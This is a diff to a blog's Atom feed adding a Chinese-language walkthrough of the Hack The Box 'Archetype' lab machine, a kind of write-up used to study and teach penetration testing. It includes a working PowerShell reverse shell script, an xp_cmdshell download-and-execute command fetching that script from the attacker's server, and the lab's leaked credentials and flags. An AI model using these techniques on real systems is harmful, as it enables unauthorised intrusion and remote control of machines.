@@ -6,7 +6,7 @@
   <link href="https://wenbuer.github.io/atom.xml" rel="self"/>
   
   <link href="https://wenbuer.github.io/"/>
-  <updated>2021-03-15T05:39:41.000Z</updated>
+  <updated>2021-04-13T14:02:06.000Z</updated>
   <id>https://wenbuer.github.io/</id>
   
   <author>
@@ -15,6 +15,42 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>HTB-Archetype WriteUp</title>
+    <link href="https://wenbuer.github.io/2021/04/13/HTB-Archetype%20WriteUp/"/>
+    <id>https://wenbuer.github.io/2021/04/13/HTB-Archetype%20WriteUp/</id>
+    <published>2021-04-13T14:02:00.000Z</published>
+    <updated>2021-04-13T14:02:06.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="HTB-Archetype-WriteUp"><a href="#HTB-Archetype-WriteUp" class="headerlink" title="HTB-Archetype WriteUp"></a>HTB-Archetype WriteUp</h3><h4 id="nmap-扫描"><a href="#nmap-扫描" class="headerlink" title="nmap 扫描"></a>nmap 扫描</h4><p><code>nmap -sV -sC 10.10.10.27</code></p><p><img src="https://cdn.jsdelivr.net/gh/wenbuer/picgo@master//img/20210313210153.png" style="zoom:67%;" /></p><p>根据上图扫描结果，靶机开放了135、139、445、1433端口</p><ul><li>135端口为RPC，可以进行口令爆破</li><li><p>139端口为NetBIOS</p></li><li><p>445端口为SMB文件共享</p></li><li>1433端口与SQL服务有关</li></ul><h4 id="445端口SMB文件共享"><a href="#445端口SMB文件共享" class="headerlink" title="445端口SMB文件共享"></a>445端口SMB文件共享</h4><p>先查看SMB的共享文件</p><p><code>smbclient -L 10.10.10.27</code></p><p><img src="https://cdn.jsdelivr.net/gh/wenbuer/picgo@master//img/20210313204721.png" style="zoom:67%;" /></p><p>smb要求输入密码，但是直接按回车之后，也可以看到共享列表</p><p>在图中可以看到backups为共享的对象为全体，直接访问backups文件夹</p><p><code>smbclient //10.10.10.27/backups</code></p><p>回车</p><p>然后用<code>ls</code>查看backups文件内容</p><p>用<code>get</code>获取prod.dtsConfig文件</p><p><img src="https://cdn.jsdelivr.net/gh/wenbuer/picgo@master//img/20210313205904.png" style="zoom: 67%;" /></p><p>prod.dtsConfig文件就下载到了我们服务器中</p><p><img src="https://cdn.jsdelivr.net/gh/wenbuer/picgo@master//img/20210313212722.png" style="zoom:67%;" /></p><p>在prod.dtsConfig文件中，可以找sql的User ID和Password</p><p>SQL Server的身份验证方式有两种：操作系统身份验证和数据库身份验证</p><p>这里的参数值是操作系统身份验证方式，ARCHETYPE为主机名，sql_svc为登录数据库的操作系统用户名</p><h4 id="mssqlclient登入数据库执行脚本"><a href="#mssqlclient登入数据库执行脚本" class="headerlink" title="mssqlclient登入数据库执行脚本"></a>mssqlclient登入数据库执行脚本</h4><p>这边需要下载impacket工具</p><p><code>git clone https://github.com/SecureAuthCorp/impacket</code></p><p><code>cd impacket</code></p><p><code>python3 setup.py install</code></p><p>然后利用mssqlclient和获取到的账号密码登入数据库</p><p><code>mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth</code></p><p><code>M3g4c0rp123</code></p><p><img src="https://cdn.jsdelivr.net/gh/wenbuer/picgo@master//img/Lily_Screenshot_1615812452.png" style="zoom:67%;" /></p><p>登入成功之后，我们需要测试一下该账号是否具有最高的sysadmin权限</p><p><code>SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)</code></p><p><img src="https://cdn.jsdelivr.net/gh/wenbuer/picgo@master//img/image-20210315205958962.png" style="zoom: 67%;" /></p><p>结果显示，该账号确实具有sysadmin的权限，接下来启用xp_cmdshell获得RCE并反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mssql">EXEC sp_configure &#39;Show Advanced Options&#39;, 1; <br>reconfigure; <br>sp_configure;<br>EXEC sp_configure &#39;xp_cmdshell&#39;, 1;<br>reconfigure;<br>xp_cmdshell &quot;whoami&quot;<br></code></pre></td></tr></table></figure><p>其中执行whoami的结果显示如下</p><p><img src="https://cdn.jsdelivr.net/gh/wenbuer/picgo@master//img/image-20210315213821244.png" style="zoom:67%;" /></p><p>说明该账户在SQL服务中具有archetype\sql_svc，但是在host上不具有任何权限</p><p>创建一个shell.ps1脚本，内容如下</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$client</span> = <span class="hljs-built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="hljs-string">&quot;10.xx.xx.x&quot;</span>,xxx);<span class="hljs-variable">$stream</span> =<span class="hljs-variable">$client</span>.GetStream();[<span class="hljs-built_in">byte</span>[]]<span class="hljs-variable">$bytes</span> = <span class="hljs-number">0</span>..<span class="hljs-number">65535</span>|%&#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">while</span>((<span class="hljs-variable">$i</span> =<span class="hljs-variable">$stream</span>.Read(<span class="hljs-variable">$bytes</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$bytes</span>.Length)) <span class="hljs-operator">-ne</span> <span class="hljs-number">0</span>)&#123;;<span class="hljs-variable">$data</span> = (<span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bytes</span>,<span class="hljs-number">0</span>, <span class="hljs-variable">$i</span>);<span class="hljs-variable">$sendback</span> = (<span class="hljs-built_in">iex</span> <span class="hljs-variable">$data</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> |<span class="hljs-built_in">Out-String</span> );<span class="hljs-variable">$sendback2</span> = <span class="hljs-variable">$sendback</span> + <span class="hljs-string">&quot;# &quot;</span>;<span class="hljs-variable">$sendbyte</span> =([<span class="hljs-type">text.encoding</span>]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>);<span class="hljs-variable">$stream</span>.Write(<span class="hljs-variable">$sendbyte</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$sendbyte</span>.Length);<span class="hljs-variable">$stream</span>.Flush()&#125;;<span class="hljs-variable">$client</span>.Close()<br></code></pre></td></tr></table></figure><p>查一下本地ip地址</p><p><code>ifconfig tun0</code></p><p><img src="https://i.loli.net/2021/03/16/TtYaHsXwW1JrncO.png" style="zoom:67%;" /></p><p>得知本机在局域网内的ip为10.10.16.10</p><p>修改shell.ps1脚本内ip内容为10.10.16.10，端口为443</p><p>然后在shell.ps1脚本存在的文件夹下运行http服务，因为80端口有服务运行，选择在81端口上运行</p><p><code>python3 -m http.server 81</code></p><p><img  src="https://i.loli.net/2021/03/16/tBRNGaxFJSqgo6L.png"   style="zoom:67%;" /><span class="image-caption">image-20210316112555605</span></p><p>然后去另一个窗口运行nc，等待10.10.10.27的连接</p><p><code>nc -nlvp 443</code></p><p><img src="https://i.loli.net/2021/03/16/pab5TFDsLtrJOYe.png" style="zoom:67%;" /></p><p>接下来进sql窗口执行下列命令</p><p><code>xp_cmdshell &quot;Powershell &quot; IEX(New-Object Net.WebClient).DownloadString(\&quot;http://10.10.16.10:81/shell.ps1\&quot;);&quot;</code></p><p>在http和nc窗口同时得到反馈</p><p><img src="https://i.loli.net/2021/03/16/FitkpM9E5BbSDO1.png" style="zoom: 50%;" /></p><p>在<code>\user\sql_svc\desktop</code>下获取user.txt</p><p><img src="https://cdn.jsdelivr.net/gh/wenbuer/picgo/img/image-20210413214419239.png" alt=""></p><p>得到user flag <code>3e7b102e78218e935bf3f4951fec21a3</code></p><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>前面得到的只是普通用户的账号，接下来可以通过type指令查看Powershell的历史记录文件</p><p><code>type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code></p><p><img src="https://cdn.jsdelivr.net/gh/wenbuer/picgo/img/image-20210413215004497.png" alt=""></p><p>这表示backups对管理员账号进行了映射，我们可以用psexec.py来取得管理员权限</p><p>接下来用管理员账号<code>administrator</code>和密码<code>MEGACORP_4dm1n!!</code>进行登入</p><p><img src="https://cdn.jsdelivr.net/gh/wenbuer/picgo/img/image-20210413215553355.png" alt=""></p><p>进入到管理员桌面，取得root.txt</p><p><img src="https://cdn.jsdelivr.net/gh/wenbuer/picgo/img/image-20210413215944832.png" alt=""></p><p>提交flag<code>b91ccec3305e98240082d4474b848528</code>，完成Archetype机器</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h3 id=&quot;HTB-Archetype-WriteUp&quot;&gt;&lt;a href=&quot;#HTB-Archetype-WriteUp&quot; class=&quot;headerlink&quot; title=&quot;HTB-Archetype WriteUp&quot;&gt;&lt;/a&gt;HTB-Archetype WriteUp&lt;/</summary>
+      
+    
+    
+    <content src="https://wenbuer.github.io/images/cover/wallhaven-11.png" type="image"/>
+    
+    
+    <category term="HTB" scheme="https://wenbuer.github.io/categories/HTB/"/>
+    
+    <category term="Hacker" scheme="https://wenbuer.github.io/categories/Hacker/"/>
+    
+    <category term="Security" scheme="https://wenbuer.github.io/categories/Security/"/>
+    
+    <category term="Penetration testing" scheme="https://wenbuer.github.io/categories/Penetration-testing/"/>
+    
+    
+    <category term="HTB" scheme="https://wenbuer.github.io/tags/HTB/"/>
+    
+    <category term="Study life" scheme="https://wenbuer.github.io/tags/Study-life/"/>
+    
+    <category term="Penetration testing" scheme="https://wenbuer.github.io/tags/Penetration-testing/"/>
+    
+  </entry>
   
   <entry>
     <title>NeSE丙队3月月赛训练</title>
